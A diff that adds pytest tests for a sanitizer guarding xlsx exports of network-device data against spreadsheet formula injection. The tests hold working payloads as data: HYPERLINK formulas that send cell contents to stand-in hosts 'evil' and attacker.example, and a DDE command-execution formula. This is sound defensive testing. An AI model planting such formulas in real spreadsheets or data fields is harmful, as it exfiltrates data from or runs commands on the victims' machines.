@@ -26,6 +26,48 @@ def test_xls_sanitize_strips_control_chars_keeps_text():
     assert _xls_sanitize(42) == 42 and _xls_sanitize(None) is None         # non-strings pass through
 
 
+def test_xls_sanitize_neutralizes_leading_equals_formula_injection():
+    """[audit-6 sec HIGH] xlsx formula injection: openpyxl writes a STRING cell whose first char is '=' as a
+    LIVE formula (data_type='f'), so an attacker-influenced device field -- a hostname / interface
+    description / CDP-LLDP neighbour / VLAN name set to =HYPERLINK("http://evil/"&A1,"click") or
+    =cmd|'/c calc'!A1 (DDE) -- executes in the CLIENT's workbook on open. _xls_sanitize must force a
+    leading-'=' string back to inert text with the apostrophe prefix."""
+    assert _xls_sanitize('=HYPERLINK("http://evil/"&A1,"x")').startswith("'=")
+    assert _xls_sanitize("=cmd|'/c calc'!A1") == "'=cmd|'/c calc'!A1"
+    assert _xls_sanitize("=1+1") == "'=1+1"
+    # idempotent: a value that arrives already-prefixed (append-wrap then the Cell.value setter both fire)
+    # must NOT double-prefix -- "'=x" does not start with '=' so it is left alone
+    assert _xls_sanitize("'=1+1") == "'=1+1"
+    # '+','-','@' are stored by openpyxl as ordinary strings (NOT live formulas in the .xlsx) and are
+    # legitimate leading chars in delta / placeholder / negative cells -> they must be LEFT ALONE (else
+    # real deliverable content is corrupted on re-read).
+    for legit in ("+3 added", "-2 removed", "-", "@handle", "EDGE-SW1", "10.0.0.1", ""):
+        assert _xls_sanitize(legit) == legit, legit
+
+
+def test_workbook_refuses_live_formula_from_device_string(tmp_path):
+    """NON-VACUOUS end-to-end proof: a malicious hostname written through the real harden_workbook chokepoint
+    -- via all three write paths (cell(value=), the direct Cell.value setter, and append) -- saved and
+    RELOADED must NOT be a live formula cell. openpyxl marks a leading-'=' string as data_type='f' (verified:
+    stock openpyxl writes 'f' for all three paths); the guard must yield data_type='s' (inert text). Removing
+    the apostrophe-prefix in _xls_sanitize flips every cell back to 'f' -> the data_type assert fails (this
+    test is not vacuous)."""
+    payload = '=HYPERLINK("http://attacker.example/exfil?d="&A1,"Open report")'
+    wb = harden_workbook(Workbook())
+    ws = wb.active
+    ws.cell(row=1, column=1, value=payload)          # ws.cell(value=) path
+    ws["B1"] = payload                                # direct Cell.value-setter path
+    ws.append([payload])                              # ws.append path
+    out = tmp_path / "inj.xlsx"
+    wb.save(str(out))
+    ws2 = load_workbook(str(out)).active
+    for addr in ("A1", "B1", "A2"):
+        c = ws2[addr]
+        assert c.data_type != "f", f"{addr} is a LIVE formula cell (data_type={c.data_type!r}) -- injection"
+        assert c.data_type == "s" and str(c.value).startswith("'=")   # inert text, apostrophe-forced
+        assert "attacker.example" in str(c.value)                     # payload text preserved, just not live
+
+
 def test_harden_workbook_sanitizes_cell_and_append_no_raise():
     wb = harden_workbook(Workbook())
     ws = wb.create_sheet("t")          # created AFTER harden -> still wrapped via create_sheet
